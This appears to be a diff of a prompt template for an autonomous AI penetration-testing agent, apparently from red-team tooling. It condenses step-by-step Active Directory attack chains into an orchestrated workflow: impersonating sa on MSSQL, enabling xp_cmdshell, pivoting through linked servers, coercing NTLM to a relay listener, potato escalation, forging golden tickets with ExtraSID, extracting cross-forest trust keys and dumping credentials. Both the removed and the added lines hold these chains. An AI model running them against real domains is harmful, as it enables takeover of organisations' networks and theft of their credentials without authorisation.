@@ -221,163 +221,70 @@ MSSQL is often a path to domain compromise through impersonation and linked serv
 2. Enumerate linked servers → Cross-domain/forest pivoting
 3. NTLM coercion → Relay attacks
 
-### Step 1: ENUMERATE IMPERSONATION RIGHTS (RUN THIS FIRST!)
-**CRITICAL**: Always check for impersonation rights BEFORE anything else — this is the FASTEST path to sysadmin:
-```
-mssql_enum_impersonation(
-    target='<MSSQL FQDN/IP FROM netexec mssql DISCOVERY OUTPUT>',
-    username='<DOMAIN USER FROM list_credentials>',
-    password='<PAIRED PASSWORD>',
-    domain="{{ target_domain | upper }}"
-)
-```
-**Expected output showing impersonation rights:**
-```
-execute as   database   permission_name   state_desc   grantee             grantor
-----------   --------   ---------------   ----------   ----------------    -------
-b'LOGIN'     b''        IMPERSONATE       GRANT        {{ target_domain | split(pat=".") | first | upper }}\your_user    sa
-```
-→ If you see `sa` as grantor with IMPERSONATE permission, **you can become sysadmin!**
+### Workflow
 
-### Step 2: IMPERSONATE SA (if Step 1 shows you can)
-```
-mssql_impersonate(
-    target='<MSSQL FQDN/IP FROM Step 1>',
-    username='<SAME DOMAIN USER AS Step 1>',
-    password='<PAIRED PASSWORD>',
-    impersonate_user='sa',
-    query="SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')",
-    domain="{{ target_domain | upper }}"
-)
-```
-→ Verify output shows `sa` and `1` (confirming sysadmin) — then proceed to enable xp_cmdshell.
+You will not invoke MSSQL tools from this agent prompt directly. When recon
+discovers an MSSQL host (or `mssql_enum_linked_servers` finds a linked server),
+the orchestrator dispatches a focused `exploit` task whose prompt is rendered
+with the discovered SQL FQDN, the captured credential, and (for linked-server
+follow-ups) `linked_server` already populated. Inside that task you'll execute
+the chain below — the per-task template gives you a tool call with real values.
 
-### Step 3: Enable xp_cmdshell (as sysadmin)
-```
-mssql_enable_xp_cmdshell(
-    target='<MSSQL FQDN/IP FROM Step 1>',
-    username='<SAME DOMAIN USER AS Step 1>',
-    password='<PAIRED PASSWORD>',
-    impersonate_user='sa',
-    domain="{{ target_domain | upper }}"
-)
-```
+The chain (executed inside the dispatched task):
 
-### Step 4: Execute Commands
-```
-mssql_impersonate(
-    target='<MSSQL FQDN/IP FROM Step 1>',
-    username='<SAME DOMAIN USER AS Step 1>',
-    password='<PAIRED PASSWORD>',
-    impersonate_user='sa',
-    query="EXEC xp_cmdshell 'whoami /priv'",
-    domain="{{ target_domain | upper }}"
-)
-```
-→ Check for `SeImpersonatePrivilege` (enables potato attacks to SYSTEM). Common result: `NT AUTHORITY\NETWORK SERVICE` (limited).
+1. **`mssql_enum_impersonation`** — check who you can impersonate. If `sa`
+   appears as grantor with `IMPERSONATE`, you can become sysadmin.
+   Output table format:
+   ```
+   execute as   database   permission_name   state_desc   grantee             grantor
+   ----------   --------   ---------------   ----------   ----------------    -------
+   b'LOGIN'     b''        IMPERSONATE       GRANT        {{ target_domain | split(pat=".") | first | upper }}\your_user    sa
+   ```
+2. **`mssql_impersonate`** with `impersonate_user='sa'` and a verification
+   query (`SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')`). Output of
+   `sa` + `1` confirms sysadmin.
+3. **`mssql_enable_xp_cmdshell`** while impersonating `sa` — enables OS command
+   execution.
+4. **`mssql_impersonate`** with the xp_cmdshell query (e.g.
+   `EXEC xp_cmdshell 'whoami /priv'`). Look for `SeImpersonatePrivilege` (enables
+   potato attacks to SYSTEM). Common result: `NT AUTHORITY\NETWORK SERVICE`
+   (limited).
+5. **`mssql_enum_linked_servers`** — finds linked servers for cross-domain
+   pivoting. The orchestrator auto-dispatches a follow-up exploit task per
+   discovered link with `linked_server` populated, so you do NOT call
+   `mssql_exec_linked` here.
+6. **`mssql_ntlm_coerce`** with `listener_ip="{{ listener_ip }}"` — forces the
+   SQL service to authenticate to your relay listener. Captures the machine
+   account hash for relay to LDAPS.
 
-**If NETWORK SERVICE:** You may need potato attacks (GodPotato, PrintSpoofer) to escalate to SYSTEM, OR look for other attack paths like constrained delegation on discovered accounts.
-
-### Step 5: Enumerate Linked Servers
-```
-mssql_enum_linked_servers(
-    target='<MSSQL FQDN/IP FROM Step 1>',
-    username='<SAME DOMAIN USER AS Step 1>',
-    password='<PAIRED PASSWORD>',
-    domain="{{ target_domain | upper }}"
-)
-```
-→ If linked servers are reported, pivot through one. Copy the linked server name verbatim from the output:
-```
-mssql_exec_linked(
-    target='<MSSQL FQDN/IP FROM Step 1>',
-    username='<SAME DOMAIN USER AS Step 1>',
-    password='<PAIRED PASSWORD>',
-    linked_server='<NAME FROM mssql_enum_linked_servers OUTPUT>',
-    query="SELECT SYSTEM_USER",
-    domain="{{ target_domain | upper }}"
-)
-```
-
-### MSSQL NTLM Coercion
-Force SQL server to authenticate to your listener:
-```
-mssql_ntlm_coerce(
-    target='<MSSQL FQDN/IP FROM Step 1>',
-    username='<SAME DOMAIN USER AS Step 1>',
-    password='<PAIRED PASSWORD>',
-    listener_ip="{{ listener_ip }}",
-    domain="{{ target_domain | upper }}"
-)
-```
-→ Captures machine account hash for relay to LDAPS.
+If `NETWORK SERVICE` is your context after step 4, escalate via potato attacks
+(GodPotato, PrintSpoofer) or pivot to other attack paths (constrained
+delegation on discovered accounts).
 
 ## Trust Attacks
 
-### Child-to-Parent Escalation
-When a child domain krbtgt hash is available:
-```
-raise_child(
-    child_domain='<CHILD DOMAIN FQDN FROM enumerate_domain_trusts OUTPUT>',
-    username='<CHILD DA USERNAME>',
-    password='<CHILD DA PASSWORD>',
-    target_domain="{{ target_domain }}"
-)
-```
-→ Enterprise Admin, then `secretsdump` against `{{ target_dc_ip }}` and any other parent DCs.
+Trust escalation runs as dispatched `exploit` tasks (`vuln_type=cross_forest`
+or `child_to_parent`). The per-task prompt is rendered with the trust key, the
+source/target domain SIDs, and the trusted forest FQDN already populated by
+`auto_trust_follow` — you don't read those out of prior tool output yourself.
+Trigger the path by ensuring the prerequisite data lands in state:
 
-### Golden Ticket with ExtraSID (Manual)
-If `raise_child` fails, manually forge ticket with Enterprise Admin SID:
-```
-1. Get child domain SID:
-   get_sid(
-       domain='<CHILD DOMAIN FQDN FROM enumerate_domain_trusts OUTPUT>',
-       dc_ip='<CHILD DC IP FROM RECON>'
-   )
-2. Get parent domain SID:
-   get_sid(domain="{{ target_domain }}", dc_ip="{{ target_dc_ip }}")
-3. generate_golden_ticket(
-       krbtgt_hash='<CHILD KRBTGT HASH FROM secretsdump OUTPUT>',
-       domain='<CHILD DOMAIN FQDN>',
-       domain_sid='<CHILD SID FROM Step 1>',
-       user="Administrator",
-       user_id=500,
-       extra_sids='<PARENT SID FROM Step 2>-519'  # Enterprise Admins
-   )
-   → Ticket valid in parent domain
-4. Use ticket with psexec_kerberos / secretsdump_kerberos against parent DCs
-```
-
-**Note:** Silver ticket forging is done using impacket's ticketer.py directly if needed.
-Golden ticket is preferred for persistence after obtaining krbtgt hash.
-
-### Cross-Forest Trust Key Extraction
-When DA is achieved in `{{ target_domain }}` and `enumerate_domain_trusts` reports a cross-forest trust:
-```
-1. extract_trust_key(
-       domain="{{ target_domain }}",
-       dc_ip="{{ target_dc_ip }}",
-       target_domain='<TRUSTED FOREST FQDN FROM enumerate_domain_trusts OUTPUT>',
-       username="Administrator",
-       password='<CAPTURED ADMIN PASSWORD>'
-   )
-   → Returns the trusted forest's trust account NTLM hash
-
-2. create_inter_realm_ticket(
-       source_domain="{{ target_domain }}",
-       source_sid='<SOURCE SID FROM get_sid AGAINST {{ target_dc_ip }}>',
-       trust_key='<TRUST KEY FROM Step 1 OUTPUT>',
-       target_domain='<TRUSTED FOREST FQDN>',
-       target_sid='<TARGET SID FROM get_sid AGAINST TRUSTED FOREST DC>'
-   )
-   → Forges inter-realm TGT
-
-3. Use ticket for secretsdump_kerberos against the trusted forest's DCs
-```
+- **Child-to-Parent escalation** runs when a child-domain krbtgt hash and
+  child-DA credentials are present. The dispatched task either calls
+  `raise_child` (automated path) or, when the manual ExtraSID path is taken,
+  forges a golden ticket whose `extra_sids` is the parent forest's SID with
+  `-519` appended (the Enterprise Admins RID).
+- **Cross-Forest Trust Key Extraction** runs when DA in `{{ target_domain }}`
+  exists and `enumerate_domain_trusts` reports a forest trust. The chain is
+  `extract_trust_key` → `create_inter_realm_ticket` → `secretsdump_kerberos`.
+  The `secretsdump_kerberos` step is auto-chained from the `.ccache` produced
+  by the inter-realm ticket forge (via `auto_chain_s4u_secretsdump`).
 
 **Important:** SID filtering blocks RID<1000 across forest trusts. If inter-realm
 ticket path fails, look for organic paths: MSSQL links, ACL chains, or foreign
-security principals within the target forest.
+security principals within the target forest. Note: silver ticket forging is
+done via impacket's ticketer.py if needed; golden ticket is preferred for
+persistence once a krbtgt hash is in hand.
 
 ## Local Privilege Escalation
 
